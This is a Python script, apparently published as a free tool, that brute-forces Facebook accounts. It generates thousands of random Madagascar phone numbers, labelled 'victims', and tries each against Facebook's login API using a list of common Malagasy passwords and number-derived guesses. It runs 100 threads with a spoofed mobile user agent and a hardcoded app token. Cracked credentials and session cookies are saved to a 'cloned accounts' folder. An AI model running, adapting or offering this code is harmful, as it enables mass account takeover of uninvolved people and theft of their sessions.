# if __name__=='__main__':
import os,requests,string,random,uuid,re,json,time,sys,datetime
from concurrent.futures import ThreadPoolExecutor as Executor
user_auth=[]
loop=0
#mon logo
def banner():
    font="""
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▓█████  ▄████▄   ██ ▄█▀ ▒█████   UNLT*
        ▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▒██▒  ██▒
        ▒███   ▒▓█    ▄ ▓███▄░ ▒██░  ██▒
        ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒██   ██░
        ░▒████▒▒ ▓███▀ ░▒██▒ █▄░ ████▓▒░
        ░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░ ▒░▒░▒░ 
         ░ ░  ░  ░  ▒   ░ ░▒ ▒░  ░ ▒ ▒░ 
           ░   ░        ░ ░░ ░ ░ ░ ░ ▒  
           ░  ░░ ░      ░  ░       ░ ░  
               ░                                              
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
                    Author:
                 ANKOAY-FENO ☣️
                    Github:
        https://github.com/Ankoay-Feno
                   Facebook:
  https://www.facebook.com/antoine.jean.75033    
                    status:
         tool free and open source                  
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
"""
    print(font)


def random_color():
    colors = ['\u001b[38;5;198m', '\u001b[38;5;210m', 
              '\u001b[38;5;190m', '\u001b[38;5;147m', 
              '\u001b[38;5;28m', '\u001b[38;5;165m', 
              '\u001b[38;5;129m']
    return random.choice(colors)

def color(params, text):
    colors = {
    'red': '\u001b[38;5;198m',
    'orange': '\u001b[38;5;210m',
    'yellow': '\u001b[38;5;190m',
    'green': '\u001b[48;5;34m',
    'blue': '\u001b[38;5;28m',
    'indigo': '\u001b[38;5;165m',
    'purple': '\u001b[38;5;129m',
    'random_color': random_color(),
    'error': '\u001b[41m'
    }
    return colors[params] + text + '\u001b[0m'

def get_current_date():
    current_time=datetime.datetime.now()
    formated_date=current_time.strftime('%A-%B-%d-%Y')
    return formated_date


def enter_sim_code():
    sim_code=''
    compt=0
    while sim_code not in ['26132', '26133', '26134', '26138']:
        if compt >0:
            print('                 '+color('error','INVALID INPUT'))
        sim_code=input(color('random_color','           ENTER MADAGASCAR SIM CODE ')+color('random_color','\n                    👉26133\n                    👉26132\n                    👉26134\n                    👉26138\n                    👉'))
        clear()
        compt += 1
    return sim_code

def write_on_file(file,containes,on_or_not='not on directory'):
    if not os.path.exists(on_or_not) and on_or_not!='not on directory':
        os.makedirs(on_or_not)
    if on_or_not!='not on directory':
        DIRECTORY_PATH=os.path.join(os.getcwd(),on_or_not) 
    else:
        DIRECTORY_PATH=os.getcwd()
    FILE_PATH=os.path.join(DIRECTORY_PATH,file)
    with open(FILE_PATH,'a') as file_to_write:
        file_to_write.write(containes)

def enter_victims_numbers():
    limit=0
    while  limit==-1 or limit<=0:
        try:
            if limit ==-1:
                tab_size=4
                print('\t      '+color('error',"VALUE NOT AN INTEGER"))
            limit=int(input(color('random_color','\t    ENTER NUMBERS OF VICTIMES')+color('random_color','\n\t\t   👉2000😼\n\t\t   👉5000😻\n\t\t   👉10000🙀\n\t\t   👉20000👹\n\t\t   👉')))
        except ValueError:
            limit=-1
        finally:
            clear()
    return limit

def clear():
    os.system('clear')
    banner()
 
def create_uuid():
    clear()
    global limit
    limit=enter_victims_numbers()
    users_ids=[]
    sim_code=enter_sim_code()
    for i in range(limit):
        dot='.'
        number_ph_after=''.join(str(random.randint(0,9)) for _ in range(7))
        users_ids.append(number_ph_after)
        print(color('random_color',f'       creating victimes numbers '+dot*(i%7)))
        print(f'victime n*:{i+1} 📠 {sim_code+number_ph_after} [{i*100/limit}%]')
        clear()
    with Executor(max_workers=100) as NODE:
        total_users=len(users_ids)
        for number_ph_after in users_ids:
            number_ph=sim_code+number_ph_after
            pass_list=[number_ph, '0'+sim_code[3:]+number_ph_after,number_ph_after,
                       number_ph_after[:6],number_ph_after[6:],number_ph[5:],number_ph[6:],
                       'malala','fitiavana','mamako','malalako','mamiko','badoda','mendrika',
                       'antananarivo','Antananarivo','marary','milely','taimbo','hanitra',
                       'vadiko','jesosy','mahery','malagasy','Malagasy','henintsoa','mahaleo',
                       'miangaly','nomena','nantenaina','fanantenana','sarobidy','fanomezana',
                       'fanomezantsoa','dadatoa','tsiory','tsiaro','bonjour','madagasikara',
                       'tiavima','boxeur','jacque','titanic','qwerty','azerty','papasosy',
                       'mamasossy','tahiana','tantely','tanora','felana','tsilavina',
                       'nekena','finoana','fanantenana','harena','anjara','vololona',
                       'liantsoa','tanjona','fifaliana','je t\'aime','fanomezana','narindra',
                       'mirindra','lalaina','voahangy','iharitiana','mamisoa','mamatsoa',
                       'sitraka','herilaza','herilaza','cedrick','nasaina','nandrianina',
                       'tafita','safidy','fenosoa','domoina','hasina','nilaina']
            NODE.submit(cracker_method,number_ph,pass_list)
    print(color('green','\nACOUNT CLONED :'+str(len(user_auth))))
    input(color('green','\nCLONING FINISHED'))
    program()


def cracker_method(number_ph,pass_list):
    global user_auth
    global loop
    try:
        for password in pass_list:
            sys.stdout.write('\r\r [Progress] %s'%(loop))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            payloads={'adid': adid,
                      'format': 'json',
                      'device_id': device_id,
                      'email': number_ph,
                      'password': password,
                      'generate_analytics_claims': '1',
                      'credentials_type': 'password',
                      'source': 'login',
                      'error_detail_type': 'button_with_disabled',
                      'enroll_misauth': 'false',
                      'generate_session_cookies': '1',
                      'generate_machine_id': '1',
                      'meta_inf_fbmeta': '',
                      'currently_logged_in_userid': '0',
                      'fb_api_req_friendly_name': 'authenticate'}
            headers={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
                     'Accept-Encoding': 'gzip, deflate',
                     'Accept': '*/*',
                     'Connection': 'keep-alive',
                     'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                     'X-FB-Friendly-Name': 'authenticate',
                     'X-FB-Connection-Bandwidth': '21435',
                     'X-FB-Net-HNI': '35793',
                     'X-FB-SIM-HNI': '37855',
                     'X-FB-Connection-Type': 'unknown',
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            response=requests.post(url,data=payloads,headers=headers)
            response=response.json()
            if 'session_key' in response:
                try:
                    user_id=response['uid']
                except:
                    user_id=number_ph
                if user_id in user_auth:
                    break
                else:
                    print('[🦏|🦅]',str(user_id),'|',password)
                    cookies="".join(i['name']+':'+i['value'] for i in response['session_cookies'])
                    print('COOKIES:',cookies)
                    file_name=get_current_date()
                    write_on_file('ecko(🦏 || 🦅)'+file_name,f'{user_id} || {password}\n','cloned_acount')
                    user_auth.append(user_id)
            else:
                continue
        loop+=1
    except:   
        pass

def using_choice():
    number=['01)','02)','03)']
    letter=['START RANDOM CLONING','HISTORICAL ACOUNT CLONED','EXIT PROGRAM']
    color_code_letter=color('random_color','X')
    color_code_number=color('random_color','X')
    number = [color_code_number.replace('X', number[0]), color_code_number.replace('X', number[1]), color_code_number.replace('X', number[2])]
    letter = [color_code_letter.replace('X', letter[0]), color_code_letter.replace('X', letter[1]), color_code_letter.replace('X', letter[2])]   
    choice=input(f"""
            {number[0]+letter[0]}
          {number[1]+letter[1]}
                {number[2]+letter[2]}
            {color('random_color','👉')}""")
    return choice

#lire les contenue des logs cloning
def read_containes_file(file_path,name_file):
    clear()
    print(color('green',f' on {name_file}'))
    with open (file_path,'r') as file:
        containes_file=file.readline()
        while containes_file!='':
            print(containes_file)
            containes_file=file.readline()

def read_file():
    DIRECTORY_PATH=os.getcwd()
    if os.path.exists('cloned_acount'):
        FOLDER_PATH=os.path.join(DIRECTORY_PATH,'cloned_acount')
        files=os.listdir(FOLDER_PATH)
        if len(files)==1:
            print('error','HiSTORICAL NONE')
        i=0
        tab_files=[]
        compt=0
        for file in files:
            tab_files.append(file)
        choice=choice_file(tab_files,compt)
        if choice == 0:
            program()
        else:
            FILE_PATH=os.path.join(FOLDER_PATH,tab_files[choice-1])
            read_containes_file(FILE_PATH,tab_files[choice-1])
            input(color('green','ALL ACOUNT CLONED'))
            program()


def choice_file(tab_file, compt):
    clear()
    while True:
        clear()
        if compt > 0 and len(tab_file) > 0:
            print(color('error', 'INPUT ERROR !'))
        print(color('green', 'HISTORICAL-ACOUNT-CLONED\n'))
        bar = color('random_color', '▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n')
        print(bar)
        if len(tab_file) < 1:
            print(color('error', 'HISTORICAL NONE'))
        len_choice = len(tab_file)
        for i in range(len_choice):
            print(f'\t   {i + 1}){tab_file[i]}')
        print(bar)
        try:
            index_choice = int(input(color('random_color', 'ENTRER CHOICE\n \'0\' TO RETURN MENU\n👉')))
            if index_choice > len_choice or index_choice < 0:
                raise ValueError
            break  # Sort de la boucle si l'entrée est valide
        except ValueError:
            compt += 1
            continue  # Continue à demander une entrée valide
    return index_choice


        

#main program
def program():
    clear()
    choice=using_choice()
    while choice != '01' and choice != '1' and choice !='02' and choice !='2' and choice !='03' and choice !='3':
        clear()
        print(color('error','\t\tINVALIDE CHOICE'))
        choice=using_choice()
    match choice:
        case '01' | '1':
            create_uuid()
        case '02' | '2':
            read_file()
        case '03' | '3':
            exit()
        case _:
            print()


    

program()
